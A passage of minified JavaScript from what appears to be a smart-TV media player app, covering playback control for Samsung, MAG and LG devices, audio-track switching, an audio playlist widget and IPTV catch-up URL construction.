return 50},getInfo:function(m){if(maJor.params.get('xmode')==1)var text="FULL";else if(maJor.params.get('xmode')==0)text="ORIGINAL";else if(maJor.params.get('xmode')==2)text="MANUAL "+maJor.params.get('Pw')+"%/"+maJor.params.get('Ph')+"%";vPlayer.ratioText=text;if(m=="prop")return text;text="";if(this.SefPlugin)var r=String(this.SefPlugin.Execute('GetVideoResolution')||"").split('|');else r=[this.plugin.GetVideoWidth(),this.plugin.GetVideoHeight()];if(String(this.url).indexOf("COMPONENT=HLS")>0)text+=" HLS ";if(r.length){if(r[0]==5)r=[540,432];else if(r[0]==4)r=[480,270];this.w=r[0];this.h=r[1];if(r[0])vPlayer.resolution=" "+r[0]+"x"+r[1]}else{this.w="";this.h=""}
return text},setSize:function(n){var c=vPlayer;if(c.is_mini())return;if(n==null)n=parseInt(maJor.params.get('xmode'))||0;if(n<0)n=2;else if(n>2)n=0;var x_res=960,y_res=540;if(!this.w)this.getInfo();if(this.w){var area_x=0;var area_y=0;var area_w=960;var area_h=540;var crop_x=0;var crop_y=0;var crop_w=this.w;var crop_h=this.h;if(n==0){if(crop_w/crop_h<1.79){area_w=y_res*crop_w/crop_h;area_x=(x_res-area_w)/2}else{area_h=x_res*crop_h/crop_w;area_y=(y_res-area_h)/2}}else if(n==2){if(maJor.params.get('Pw')>200)maJor.params.set('Pw',200);if(maJor.params.get('Ph')>200)maJor.params.set('Ph',200);if(maJor.params.get('Pw')<=100){area_w=(x_res/100)*maJor.params.get('Pw');area_x=(x_res-area_w)/2}else{crop_x=crop_w*(maJor.params.get('Pw')/200-0.5);crop_w=crop_w*(2-maJor.params.get('Pw')/100)}
if(maJor.params.get('Ph')<=100){area_h=(y_res/100)*maJor.params.get('Ph');area_y=(y_res-area_h)/2}else{crop_y=crop_h*((maJor.params.get('Ph')/200)-0.5);crop_h=crop_h*(2-maJor.params.get('Ph')/100)}}
if(this.SefPlugin){this.SefPlugin.Execute('SetDisplayArea',area_x,area_y,area_w,area_h);if(n!=1)this.SefPlugin.Execute('SetCropArea',crop_x,crop_y,crop_w,crop_h);else if(this.change)this.SefPlugin.Execute('SetCropArea',0,0,0,0)}else{this.plugin.SetDisplayArea(area_x,area_y,area_w,area_h);if(n!=1)this.plugin.SetCropArea(crop_x,crop_y,crop_w,crop_h);else if(this.change)this.plugin.SetCropArea(0,0,0,0)}
this.change=!0}
maJor.params.set('xmode',n)},setMini:function(){var c=vPlayer;if(c.is_mini()){if(this.SefPlugin)this.SefPlugin.Execute('SetDisplayArea',643,340,317,200);else this.plugin.SetDisplayArea(643,340,317,200);this.onstop=function(){FXMLPage.l1I1IQlO1ZkV1IOOOllYpr()}
FXMLPage.l1I1IQlO1ZkV1IOOOllYpr()}else{$_("main").style.background="none";$_("pr").style.background="none";$_("bcg1").style.display="none";$_("bcg2").style.display="none";if(this.SefPlugin)this.SefPlugin.Execute('SetDisplayArea',0,0,960,540);else this.plugin.SetDisplayArea(0,0,960,540)}},LangCodes:{6514793:'Китайская',6647399:'Английская',6713957:'Француская',6776178:'Немецкая',6911073:'Итальянская',6975598:'Японская',7040882:'Корейская',7368562:'Португальская',7501171:'Русская',7565409:'Испанская'},audioTracks:function(set){if(this.SefPlugin){var len=this.SefPlugin.Execute('GetTotalNumOfStreamID',1)||0;if(len>0){if(set!=null){if(set>(len-1))set=0;else if(set<0)set=len-1;this.SefPlugin.Execute('SetStreamID',1,set);this.audioCur=set}else this.audioCur=this.SefPlugin.Execute('GetCurrentStreamID',1)||0;this.audioName=this.SefPlugin.Execute('GetStreamLanguageInfo',1,set);this.audioName=this.LangCodes[this.audioName]||this.audioName;return{count:len,name:this.audioName,sel:this.audioCur}}else{this.audioCur=this.audioName=0;return}}},getAudioNum:function(){if(this.SefPlugin)return(this.SefPlugin.Execute('GetTotalNumOfStreamID',1)||0);else return 0},startAudio:function(u){if(this.init()){if(this.SefPlugin){this.SefPlugin.Open('Player','1.000','Player');this.SefPlugin.Execute('InitPlayer',u);this.SefPlugin.Execute('SetPlayerProperty','2','0','0');this.SefPlugin.Execute('StartPlayback')}else if(maJor.series=="C"){this.plugin.Play(u)}else{this.plugin.InitPlayer(u);this.plugin.SetPlayerProperty('2','0','0');this.plugin.StartPlayback()}}},init:function(){var c=vPlayer;this.plaginAudio=$_('pluginAudio');document.getElementsByTagName('body')[0].onmousemove=c.OnMouseMove;if($_('pluginObjectSef')&&$_('pluginObjectSef').Execute)this.SefPlugin=$_('pluginObjectSef');else if($_('pluginPlayer')&&$_('pluginPlayer').InitPlayer){this.plugin=$_('pluginPlayer');this.plugin.OnBufferingStart=c.OnBufferingStart;this.plugin.OnBufferingProgress=c.OnBufferingProgress;this.plugin.OnBufferingComplete=c.OnBufferingComplete;this.plugin.OnCurrentPlayTime=c.OnCurrentPlayTime}
if($_('pluginObjectTVMW')&&$_('pluginObjectTVMW').SetMediaSource)$_('pluginObjectTVMW').SetMediaSource();if($_('pluginObjectScreen3D')&&$_('pluginObjectScreen3D').Flag3DEffectSupport&&$_('pluginObjectScreen3D').Flag3DEffectSupport()&&$_('pluginObjectScreen3D').Flag3DTVConnect&&$_('pluginObjectScreen3D').Flag3DTVConnect())
this.Screen3Dplugin=$_('pluginObjectScreen3D');if(this.plugin||this.SefPlugin)return 1;else kjtYpr.inf("Error initialization samsung maple player",2000,"red")},start:function(url,start){var c=vPlayer;if(!this.init())return;$_("video").style.display="none";$_("jw").style.display="none";start=start||0;pluginAPI.setOffScreenSaver();pluginAPI.setOffIdleEvent();this.change=!1;if(is_m3u8(url)==2&&-1===url.indexOf("COMPONENT=HLS"))url+="|COMPONENT=HLS|STARTBITRATE=20000000";if(kjtYpr.buffer>10)kjtYpr.buffer=10;this.stop();this.url=url;if(url.indexOf('.mp3')==-1)this.SetBuffer();if(this.SefPlugin){this.SefPlugin.Open('Player','1.000','Player');this.SefPlugin.Execute('InitPlayer',url);this.SefPlugin.OnEvent=function(num,val){switch(num){case 1:case 3:case 4:case 6:c.eventerrvideo();break;case 11:c.OnBufferingStart();break;case 12:c.OnBufferingComplete();break;case 13:c.OnBufferingProgress(val);break;case 14:if($_("loading").style.display=="block")c.setLoading("off",Math.random());c.OnCurrentPlayTime(val);break}};if(this.mode3D)this.SefPlugin.Execute('SetPlayerProperty','2','3',this.mode3D);else this.SefPlugin.Execute('SetPlayerProperty','5','0','0');if(maJor.params.get("timeoutiptv")>49)this.SefPlugin.Execute('SetInitialTimeOut',maJor.params.get("timeoutiptv"));this.SefPlugin.Execute('StartPlayback',start)}else if(!this.plugin.StartPlayback)this.plugin.Play(url);else{this.plugin.InitPlayer&&this.plugin.InitPlayer(url);this.plugin.StartPlayback(start)}
this.setMini();c.l1O0Ol1iOVI0O1Ypr("_FPPodkluchenie_.")},stop:function(){if(this.mode3D)this.Screen3Dplugin.Set3DEffectMode(0);this.mode3D=0;if(this.SefPlugin){this.SefPlugin.Execute('Stop');this.SefPlugin.Execute('ClearScreen');this.SefPlugin.Close()}else if(this.plugin){this.plugin.Stop();this.plugin.ClearScreen()}},exit:function(){},play:function(){var c=vPlayer;if(this.SefPlugin)this.SefPlugin.Execute('Resume');else this.plugin.Resume();if(gV(c.playElement,"url").indexOf('http')==0&&c.longpause){c.frw(-3)}},seek:function(sec){sec-=this.getPosition();if(sec<0){if(this.SefPlugin)this.SefPlugin.Execute('JumpBackward',-1*sec);else this.plugin.JumpBackward(-1*sec)}
if(sec>0){if(this.SefPlugin)this.SefPlugin.Execute('JumpForward',sec);else this.plugin.JumpForward(sec)}},getPosition:function(){return vPlayer.curTime},getTotal:function(){return Math.ceil(parseInt((this.SefPlugin)?this.SefPlugin.Execute('GetDuration'):this.plugin.GetDuration())/1000)}},mag:{name:"mag",exis:function(){return window.gSTB},pause:function(){stb.Pause()},audioTracks:function(set){var pidsStr=stb.GetAudioPIDs();if(!pidsStr||pidsStr==="[]"){this.audioCur=0;this.audioName="";return}
var tracks;try{tracks=eval(pidsStr)}catch(e){this.audioCur=0;this.audioName="";return}
jsshowErr("mag200: "+pidsStr+"/"+tracks.length,-1);var len=tracks.length;if(len===0){this.audioCur=0;this.audioName="";return}
if(typeof set==="number"){if(set<0)set=len-1;if(set>=len)set=0;stb.SetAudioPID(tracks[set].pid);this.audioCur=set}else{var currentPid=stb.GetAudioPID();this.audioCur=0;for(var i=0;i<len;i++){if(tracks[i].pid==currentPid){this.audioCur=i;break}}}
var langArr=tracks[this.audioCur].lang;var langCode=(langArr&&langArr.length)?langArr[0]:"";this.audioName=(this.LangCodes&&this.LangCodes[langCode])?this.LangCodes[langCode]:langCode;return{count:len,name:this.audioName,sel:this.audioCur}},getInfo:function(m){var text="";var n=parseInt(maJor.params.get('xmode'))||0;var xsize=["_FPRastyanut_","Letter Box","Pan&Scan","Combined","Увеличенный","Оптимальный"];vPlayer.ratioText=xsize[n]||n;if(m=="prop")return vPlayer.ratioText;var w=stb.GetVideoInfo().match(/pictureWidth:(.*?),/)[1];var h=stb.GetVideoInfo().match(/pictureHeight:(.*?),/)[1];if(w&&w>0)vPlayer.resolution=w+"x"+h;return text},setSize:function(n){if(n==null)n=parseInt(maJor.params.get('xmode'))||0;if(n>5)n=1;else if(n<1)n=5;maJor.params.set('xmode',n);if(n==1)stb.SetAspect(0x10);else if(n==2)stb.SetAspect(0x20);else if(n==3)stb.SetAspect(0x30);else if(n==4)stb.SetAspect(0x40);else if(n==5)stb.SetAspect(0x50)},setMini:function(){var c=vPlayer;if(c.is_mini())stb.SetPIG(0,0.25,643,340);else stb.SetPIG(1,0,0,0)},startAudio:function(u){stb.Play(u);stb.SetPIG(1,0,0,0);stb.SetWinMode&&stb.SetWinMode(0);stb.SetTopWin&&stb.SetTopWin(0)},start:function(url){var c=vPlayer;$_("video").style.display="none";$_("jw").style.display="none";if(stb.SetCustomHeader)stb.SetCustomHeader('User-Agent: '+ua_chrome);if(c.iptv_retry==3)url=url.replace("ffrt2 ","",url);else if(url.indexOf("ffrt")==-1&&is_m3u8(url))url="ffrt2 "+url;stb.Play(url);this.setMini();this.setSize()},stop:function(){stb.Stop()},exit:function(){},volume:function(x){if(x!=null)stb.SetVolume(x);return stb.GetVolume()},play:function(){stb.Continue()},seek:function(sec){stb.SetPosTime(sec)},getPosition:function(){return stb.GetPosTime()},getTotal:function(){return stb.GetMediaLen()}},media:{name:"media",exis:function(){return 1},getInfo:function(){var c=vPlayer;vPlayer.ratioText="";if(media&&media.mediaPlayInfo&&media.mediaPlayInfo()){var playInfo=media.mediaPlayInfo();if(playInfo.bitrateInstant)text+=(playInfo.bitrateInstant/1048576).toFixed(2)+" Mbit/s";c.curTime=playInfo.currentPosition;c.totalTime=playInfo.duration}
return text},pause:function(){media.play&&media.play(0)},fullscreen:function(){if(media.requestFullScreen)media.requestFullScreen();else if(media.mozRequestFullScreen)media.mozRequestFullScreen();else if(media.webkitRequestFullScreen)media.webkitRequestFullScreen();$_("media").style.width="100%";$_("media").style.height="100%"},setMini:function(){var c=vPlayer;if(c.is_mini())c.setidprop("jw","mini");else c.setidprop("jw",0)},startAudio:function(u){$_("other").style.display="block";$_("other").style.width="1%";$_("other").style.height="1%";$_("other",'<object type="video/mp4" preBufferingTime="8" audioLanguage="ru" data="'+u+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)},start:function(url){try{if(video&&video.style)video.style.display="none";$_("jw").style.display="block";this.setMini();if(pstream&&maJor.platform().match(/lg/))var type="application/x-netcast-av";else type="video/mpeg";if(maJor.platform().match(/lg/)&&maJor.series!="LW")var opt='onPlayStateChange="vPlayer.OnBufferingComplete();" preBufferingTime="8" ';else opt='';var chl=maJor.read("mlang");if(chl&&optLang[chl]){optLangSel=chl;opt+=' audioLanguage="'+optLang[optLangSel]+'"'}
if(maJor.platform()=="ph"&&pstream)type="application/vnd.apple.mpegurl";$_("jw",'<object type="'+type+'" '+opt+'data="'+url+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)}catch(e){jsshowErr("Error media player (можете поменять в настройках): "+e.message+" "+url,2)}},stop:function(){this.pause()},exit:function(){$_("jw","");$_("jw").style.display="none"},play:function(){media.play(1)},seek:function(sec){media.seek(sec*1000)},getPosition:function(){this.getInfo();return vPlayer.curTime},getTotal:function(){this.getInfo();return vPlayer.totalTime}},OnBufferingStart:function(){var c=vPlayer;c.perProgress="1%";c.l1O0Ol1iOVI0O1Ypr()},OnBufferingProgress:function(per){var c=vPlayer;vPlayer.iptv_succed=!0;c.setLoading("on",c.curTime);if(per&&typeof per!="object"){c.perProgress=per;if(per!="."){c.perProgress+="%";if(per>95){c.OnBufferingComplete()}}}else c.perProgress="..";c.l1O0Ol1iOVI0O1Ypr()},OnBufferingComplete:function(){var c=vPlayer;maJor.statusbar();c.perProgress="";setTimeout('vPlayer.setLoading("off", Math.random());',500);c.glSec=0;c.getVideoPlayInfo();c.player().getAudioNum&&c.player().getAudioNum();c.player().setSize&&c.player().setSize();if(c.player().onstart){c.player().onstart();c.player().onstart=null}
if(l0lIl1lTqx011IYpr.match(/html5/)){if(vPlayer.setStart){video.currentTime=vPlayer.setStart;vPlayer.setStart=0}}
c.triggerHide(600);c.deletePauseOverlay();c.iptv_retry=0;c.subtitles.l01ll0PDS0I0IYpr();c.l1O0Ol1iOVI0O1Ypr()},OnCurrentPlayTime:function(val){var c=vPlayer;if($_("loading").style.display=="block")c.setLoading("off",Math.random());c.curTime=Math.ceil(parseInt(val,10)/1000);c.getVideoPlayInfo()},getInfo:function(){var c=this,text="";try{var text=((vPlayer.player().getInfo&&vPlayer.player().getInfo())||"")}catch(e){}
try{if(c.subtitles.exis())text+=" _FPSubtitles_: "+c.subtitles.getName()+" ("+c.playElement.subsrc.length+")"}catch(e){}
$_("infRatio",(vPlayer.ratioText||"Auto"));$_("infoResolution").style.display=(c.resolution?"inline":"none");$_("infoResolution",c.resolution);if(gP("is_iptv")>2)var vr="";else if(maJor.params.get('next')==1)vr="_FPPosledovatelno_";else if(maJor.params.get('next')==2)vr="_FPPovtoryat_ _FPodin_";else if(maJor.params.get('next')==4)vr="_FPOtkl._";else vr="_FPPovtoryat_ _FPvse_";$_("movNext",vr);$_("info_right",getInfoUrl(gVs(c.playUrl),c.infolink).replace(/^(.{12}).*(.{14})$/,"$1...$2"));return text},mkvSub:function(m){var c=this;if(c.player().subtitle){var xnum=c.player().extra_sub.length;if(xnum>0){if(!m)return 1;var n=c.player().sub_name;if(m=="val"){if(c.player().sub_sel===0)return"_FPSubtitles_ MKV: _FPOtkl._ ("+xnum+")";else return"_FPSubtitles_ MKV: "+n+" ("+(c.player().sub_sel)+"/"+xnum+")"}}}},l1O0Ol1iOVI0O1Ypr:function(text){var c=this;text=text||"";clearTimeout(c.inftimer);$_("infR",vPlayer.getInfo());if(c.perProgress){vPlayer.iptv_succed=!0;text+="_FPZagruzka_ "+c.perProgress}
$_("infPl",text);$_("pstream").style.display="block";if(!c.perProgress)c.inftimer=setTimeout(function(){if($_("playerBottom").style.display=="none"){$_("pstream").style.display="none";$_("infPl","")}},1500)},getCur:function(){var c=this;try{if(adsPage.state()==2&&adsPage.rek_curtime)c.curTime=adsPage.rek_curtime;else c.curTime=parseInt(c.player().getPosition())||0}catch(e){c.curTime=0}
return c.curTime},getTotal:function(){var c=vPlayer;try{if(adsPage.state()==2&&adsPage.rek_totaltime)c.totalTime=adsPage.rek_totaltime;else c.totalTime=parseInt(c.player().getTotal())||0}catch(e){c.totalTime=0}
return c.totalTime},player:function(){var c=vPlayer;if(c.audio.played())return c.audio.player();if(maJor.platform()=="android-device"&&l0lIl1lTqx011IYpr.match(/manual|media|vimu/))return c.external;else if(l0lIl1lTqx011IYpr=="audio")l0lIl1lTqx011IYpr="html5";else if(l0lIl1lTqx011IYpr=="media"){if(maJor.platform()=="maple")return c.maple;else if(maJor.platform()=="dune")return c.dune;else if(maJor.platform()=="mag")return c.mag}
return(c[l0lIl1lTqx011IYpr]||c.html5)},played:function(){if(l0lIl1lTqx011IYpr&&(handler=='player'||handler=='qual')&&$_("player").style.display=="block")return 1},audio:{active:0,player:function(){var player=maJor.params.get("player");var a=maJor.params.get('audioplayer');l0lIl1lTqx011IYpr="html5";if(maJor.platform()=="maple")player="maple";else{if(maJor.platform()=="android-device")player="html5";if(maJor.platform()=="mag")player="mag";else if(maJor.platform()=="dune")player="dune";else if(maJor.platform()=="tizen")player="tizen";else if(a!=3){if(a!=4&&(a==2||player=="html5"||player=="ifrhtml5"||player=="jw")){player="html5";l0lIl1lTqx011IYpr="audio"}else player="media"}else if(a==3)player="html5"}
return(vPlayer[player]||vPlayer.html5)},close:function(){if($_("vk_audio")){$_("vk_audio").style.display="none";$_("vk_audio").style.zIndex="-2";$_("vk_play_button").style.display="block"}},stop:function(){$_("vk_audio").style.zIndex="-2";$_("vk_audio").style.display="none";$_("vk_play_button").style.display="block";vPlayer.player().stop()},closeAndDelete:function(){var c=this;c.close();c.pl=[];c.sel=0;maJor.write("vk_audio_pl","");maJor.write("vk_audio_sel","");maJor.write("vk_pl_url","")},played:function(){return(this.active&&$_("vk_audio")&&$_("vk_audio").style.display=="block")},showPlayer:function(mode){var c=this;if(maJor.read("vk_pl_url").indexOf("http")==-1||maJor.params.get("audioplayer")<1)return;if(!c.pl||!c.pl.length){c.pl=lIlI1VBOOlI01QYpr(maJor.read("vk_audio_pl"))||[];c.sel=parseInt(maJor.read("vk_audio_sel"))||0}
if(c.pl.length)c.active=1;else{c.active=0;return}
if($_("vk_audio"))$_("vk_audio").style.display="block";else{var div=document.createElement('div');div.id='vk_audio';div.style.position="absolute";div.style.backgroundColor="rgb(89, 117, 181)";div.style.padding="2px 4px";div.style.borderRadius="5px";div.style.display="block";div.style.fontSize="18px";div.style.width="300px";div.style.height="85px";document.getElementsByTagName('body')[0].appendChild(div)}
$_("vk_audio").style.top=(maJor.screen().h-110)+"px";$_("vk_audio").style.left=(maJor.screen().w-330)+"px";$_("vk_audio","<div id='audiotitle' class='audiotitle'>"+gV(this.pl[this.sel],"description")+"</div>"+"<div class='track-info'>"+(parseInt(this.sel)+1)+"/"+this.pl.length+"</div>"+"<div id='rtma' class='rtma'></div>"+"<div onclick=\"keyHandler({'keycode':VK_STOP});\" title='Закрыть / Кнопка СТОП' class='close-btn'>x</div>"+"<div id='vk_audio_bar' class='audio-bar'><div id='vk_audio_pos' class='audio-pos'></div></div>"+"<ul>"+"<li onclick=\"keyHandler({'keycode':VK_REWIND})\" class='control-btn rewind-btn'></li>"+"<li onclick=\"keyHandler({'keycode':VK_PAUSE})\" class='control-btn pause-btn'></li>"+"<li onclick=\"keyHandler({'keycode':VK_PLAY});\" class='control-btn play-btn'></li>"+"<li onclick=\"keyHandler({'keycode':VK_FAST_FWD})\" class='control-btn fast-fwd-btn'></li>"+"<li id='vkr' title='Повтор' onclick=\"vPlayer.audio.repeat(1);\" class='control-btn repeat-btn'></li>"+"<li title='Перемешать' onclick=\"vPlayer.audio.shuffle();\" class='control-btn shuffle-btn'></li>"+"</ul>");$_('vk_audio_bar').onclick=function(e){var BarWidth=296;var x=e.pageX-$(this).offset().left;vPlayer.seek((x/BarWidth)*vPlayer.getTotal())};if(gV(mode)=="autostart")setTimeout('$_("vk_audio").style.zIndex="-2";$_("vk_audio").style.display="none";$_("vk_play_button").style.display="block";',1500);c.repeat()},repeat:function(m){if(m){this.vk_repeat=!this.vk_repeat;if(this.vk_repeat)kjtYpr.inf("Повтор: включен!",1000);else kjtYpr.inf("Повтор: отключен!",1000)}
$_("vkr").style.backgroundPosition=(this.vk_repeat?"33px -174px":"0px -174px")},vk_visual:0,visual:function(n){if(n)this.vk_visual=1;else this.vk_visual=0;if(this.vk_visual){$_("jw","<div style='z-index:1;width:100%;height:100%;background-color:black;'>"+"<img style='width:100%;height:100%;' src='"+_img("_ST_visual"+(n||3)+".gif")+"' />"+"</div>");$_("jw").style.display="block";$_("jw").style.zIndex="1"}else{$_("jw","");$_("jw").style.zIndex="0";$_("jw").style.display="none"}},shuffle:function(){kjtYpr.inf("Перемешано!",1000);for(var j,x,i=this.pl.length;i;j=parseInt(Math.random()*i),x=this.pl[--i],this.pl[i]=this.pl[j],this.pl[j]=x);this.play(null,0)},pl:[],sel:0,play:function(pl,sel){var c=this;if(sel!=null)c.sel=sel;if(pl){this.pl=[];for(var i=0;i<pl.length;i++){pl[i].stream_url=gV(pl[i],"stream_url").replace("audio://","");if(is_audio(pl[i].stream_url)){pl[i].description=Il01QllQll().get("title").replace(/<.*?>/g,"")+"<br><span style='font-size:14px;color:#EEE;'>"+pl[i].title.replace(/<.*?>/g,"").substr(0,40)+"</span>";this.pl.push(pl[i])}else if(i<c.sel)c.sel--}
maJor.write("vk_pl_url",gP("lO10111O0001lOl00Ypr"))}
if(c.sel>c.pl.length-1)c.sel=0;else if(c.sel<0)c.sel=c.pl.length-1;var u=c.pl[c.sel].stream_url.replace("audio://","");if(u.indexOf("md5hash")!=-1){is_loadpage(1);$_("audiotitle","_FPZagruzka_...");uHelper.create("directnoheader").get(c.pl[c.sel].parser.split("|")[0]).parse=function(s){if(s){c.pl[c.sel].stream_url=c.pl[c.sel].stream_url.replace("md5hash",s);c.play(null,c.sel)}else $_("audiotitle","_FPOshibka_ parse url")}
return}else{c.active=1;if(!vPlayer.stopped)vPlayer.lll0Q10I0lI1O0Oll0OOYpr();vPlayer.stopped=!1;vPlayer.end_ok=!1;vPlayer.playElement={};c.player().startAudio(u);c.showPlayer();$_("vk_audio").style.zIndex="2";maJor.write("vk_audio_pl",l1OOl0I0IASY10lQ10Ypr(c.pl));maJor.write("vk_audio_sel",c.sel)}}},l1l0O00UvlOlOO111Ypr:function(t){var c=this;t=t||c.l0QOOILTvlIO0O1Ypr;if(!adsPage.state()&&t){c.player().seek(t);$_("vrecovery","");c.l0QOOILTvlIO0O1Ypr=0;c.l1I0Ilty1w01O1IIYpr=0}},play:function(){var c=this;if(c.playUrlAudio)c.sound.play();c.player().play();clearTimeout(c.longPauseTimer);c.subtitles.l01ll0PDS0I0IYpr();if(maJor.platform()=="android-device"){setVideoResolution()}
c.longpause=0;vPlayer.paused=!1;c.deletePauseOverlay();c.triggerHide(900)},pause:function(){var c=this;c.player().pause();if(c.playUrlAudio)c.sound.pause();if(c.paused)setTimeout("vPlayer.hidePlayer(1);",1000);$_("vrecovery","");if(!adsPage.state())c.l0QOOILTvlIO0O1Ypr=0;c.SaveTime();c.longPauseTimer=setTimeout(function(){c.longpause=1},30000);c.paused=!0;if(handler=="player")c.createPauseOverlay()},deletePauseOverlay:function(){var existingOverlay=$_("pauseOverlay");if(existingOverlay){existingOverlay.parentNode.removeChild(existingOverlay)}},createPauseOverlay:function(){var existingOverlay=$_("pauseOverlay");if(!existingOverlay){var svgContainer=document.createElement("div");svgContainer.onclick=function(){vPlayer.play()};svgContainer.id="pauseOverlay";svgContainer.style.position="absolute";svgContainer.style.left="50%";svgContainer.style.top="45%";svgContainer.style.marginLeft="-38px";svgContainer.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="75px" height="75px" viewBox="0 0 240 240" focusable="false"><path d="M62.8,199.5c-1,0.8-2.4,0.6-3.3-0.4c-0.4-0.5-0.6-1.1-0.5-1.8V42.6c-0.2-1.3,0.7-2.4,1.9-2.6c0.7-0.1,1.3,0.1,1.9,0.4l154.7,77.7c2.1,1.1,2.1,2.8,0,3.8L62.8,199.5z" fill="#cccccc" ></path></svg>';var playerContainer=$_("player");if(playerContainer){playerContainer.appendChild(svgContainer)}}},iptv:{arc:{have:function(){},timestamp:0},epg:function(){}},remainingTime:function(){var c=this,tt="",xt="";if(c.iptv.arc.timestamp){var xt=c.iptv.arc.timestamp+c.curTime;var tt=T.timestamp-gV(c.playElement,"catchup_days")*24*3600;var pos=Math.ceil(((xt-tt)/(T.timestamp-tt))*c.barWidth());xt=dt(xt,!0,!0);tt=""}else if(c.playElement.epgnow){var epG=c.playElement.epgnow;xt=getTimeFromMS(epG.curTime).substring(0,5);tt=getTimeFromMS(epG.totalTime).substring(0,5);pos=Math.ceil((epG.cur/100)*c.barWidth())}else if(!c.is_arc){xt=getTimeFromMS(c.curTime);tt=getTimeFromMS(c.totalTime);pos=Math.ceil((c.curTime/c.totalTime)*c.barWidth());if(c.curTime>=30&&c.curTime%15==0)c.SaveTime()}
if(tt=="00:00:00"){tt="";if(xt=="00:00:00")xt=""}else if(tt)tt="/ "+tt;$_("remainingTime",(xt||""));$_("totalTime",(tt||""));if(pos)vPlayer.setPosition(pos)},showInfo:function(){var c=this;if(c.iptv.arc.timestamp!=0||fEpg.epgInDesc()){}else{if(c.l1I0Ilty1w01O1IIYpr&&!adsPage.state()){vPlayer.l1l0O00UvlOlOO111Ypr(c.l1I0Ilty1w01O1IIYpr);if(l0lIl1lTqx011IYpr=="ifrhtml5"){}
if(l0lIl1lTqx011IYpr=="html5")video.style.display="block";else $_("jw").style.display="block"}
if(l0lIl1lTqx011IYpr!="jw"&&l0lIl1lTqx011IYpr!="tizen"&&c.totalTime>10&&c.totalTime>c.curTime&&c.totalTime-c.curTime<=5&&(!pstream||is_vod(c.playUrl))&&!adsPage.state()&&maJor.params.get("next")!=4){if(!c.end_ok)c.endTimer=setTimeout("vPlayer.endvideo();",6000);c.end_ok=!0}
if(c.curTime<30&&!c.paused)c.getSaveTime();else{$_("vrecovery","");c.l0QOOILTvlIO0O1Ypr=0}}
c.remainingTime()},prevSec:0,getVideoPlayInfo:function(tC,tT){var c=this;if(c.glSec!=0)return;try{if(c.is_mini())return;if(piframe&&sendr&&tT!=null){sendr=!1}
c.curTime=tC||c.getCur();c.totalTime=tT||c.getTotal();if(c.audio.played()){if(c.totalTime-c.curTime<=6&&c.totalTime>0){if(!c.end_ok)c.endTimer=setTimeout("vPlayer.endvideo();",5200);c.end_ok=!0}
if(c.curTime>0&&c.totalTime>0){var pos=Math.ceil((c.curTime/c.totalTime)*292);$_("vk_audio_pos").style.width=css_wh(pos)+"px";$_("rtma","-"+(to2(c.totalTime-c.curTime)))}
return}
if($_("playerBottom").style.display=="block"&&adsPage.state()!=2&&!vPlayer.paused)$_("infR",vPlayer.getInfo());if(adsPage.state()&&c.totalTime>0){adsPage.event(c.curTime,c.totalTime)}
if(c.curTime>0||c.totalTime>0){if($_("statbar2").style.display!="none")maJor.statusbar("off");c.iptv_succed=!0;c.iptv_retry=0;if($_("loading").style.display=="block")c.setLoading("off",c.curTime);if(c.prevSec!=c.curTime&&c.perProgress)c.OnBufferingComplete();c.prevSec=c.curTime;if(c.playUrlAudio&&c.sound){if(handler=="menu")c.sound.pause();else{if(c.curTime==0)c.sound.play();if(!c.paused){if(Math.abs($_("video").currentTime-c.sound.currentTime)>0&&Math.abs(c.totalTime-c.sound.duration)<10&&c.totalTime>10){if(--c.soundn<1){if(l0lIl1lTqx011IYpr=="html5"||l0lIl1lTqx011IYpr=="ifrhtml5")c.sound.currentTime=$_("video").currentTime;else c.sound.currentTime=c.curTime;if(ttmac)kjtYpr.popUp("audio sync "+c.sound.currentTime+"<br>cur="+c.curTime+"<br>Tot="+c.totalTime,800);c.sound.play();c.soundn=20}}}}}
if(c.curTime>c.totalTime&&c.curTime>11*3600)c.curTime=0;if(c.curTime==10&&handler=="player"&&!adsPage.state())gP().sendStat(1)}
c.showInfo()}catch(e){}},arc_fwd:0,arcurl:function(u,t,catchup,catchup_source){var au=u||"";if(catchup=="default"&&catchup_source)
au=catchup_source.replace("${start}",t).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-t);else if(catchup=="append"&&catchup_source)
au+=catchup_source.replace("${start}",t).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-t);else if(catchup=="flussonic"||catchup=="fs"||catchup=="flussonic-hls")
au=au.replace(/([^\?]*\/)([^\?]*?)(\.|\?|$)(.*)/,"$1$2-"+t+"-10800$3$4");else if(catchup=="shift"||1){if(u.indexOf("?")>0)au+="&";else au+="?";au+="utc="+t+"&lutc="+T.timestamp}
return au},arcfwd:function(sec){var c=this;c.player().stop();c.arc_fwd+=sec;c.setLoading("on");c.iptv.arc.timestamp=T.timestamp+c.arc_fwd;var u=c.playElement.source_url||c.playElement.stream_url;var g=gP("global")||{};var source=c.playElement.catchup_source||g["catchup-source"]||g.catchup_source||"";c.l1100OlxlQQ00lO0Ypr(c.arcurl(u,(T.timestamp+c.arc_fwd),gV(c.playElement,"catchup"),source));c.getVideoPlayInfo()},seek:function(sec){var c=this;sec=Math.ceil(sec);c.glSec=0;$_("arrowtime").style.display="none";if(gV(c.playElement,"catchup")&&gV(c.playElement,"catchup_days")){c.arcfwd(sec)}else if(c.getTotal()>0){if(sec<0)sec=0;c.player().seek(sec);setTimeout("vPlayer.subtitles.l01ll0PDS0I0IYpr();",3000)}},setPercent:function(per){var c=this;if(c.is_arc){var tt=Math.ceil(T.timestamp-(1-(per/100))*gV(c.playElement,"catchup_days")*24*3600);c.arc_fwd=0;c.iptv.arc.timestamp=0;c.arcfwd(Math.ceil(tt-T.timestamp))}else if(gP("is_iptv")>2){clearTimeout(qch_timer);qch_timer=setTimeout(function(){qch_num=parseInt(qch_num);if(qch_num>gP().channels.length){kjtYpr.popUp("Не существует!",1300)}else{setSelect(qch_num-1);Il01QllQll().play()}
